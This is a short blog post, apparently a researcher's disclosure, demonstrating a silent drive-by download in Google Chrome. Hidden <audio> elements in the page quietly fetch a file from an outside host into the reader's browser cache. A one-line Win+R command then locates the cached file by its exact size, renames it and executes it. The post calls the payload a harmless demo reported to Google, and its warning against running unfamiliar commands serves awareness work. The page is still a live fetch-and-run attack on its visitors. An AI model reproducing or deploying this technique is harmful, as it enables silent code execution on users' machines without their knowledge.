---
layout: post
title: Don't run commands you don't really understand
comments: true
---

This demonstrates a fully silent drive-by download in Google Chrome -
  and will launch a demo PoC if this seemingly harmless command is entered in a **Win+R** prompt:

<pre>
cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
</pre>

Can you figure out how this works?

<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />
<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />

Notes: 

  * The PoC is a harmless demo
  * Chiptune in PoC is (c) 1999 Jozz
  * Reported to Google in November 2015 (status: Wontfix)

<A href=https://twitter.com/hexatomium>Follow</A> @hexatomium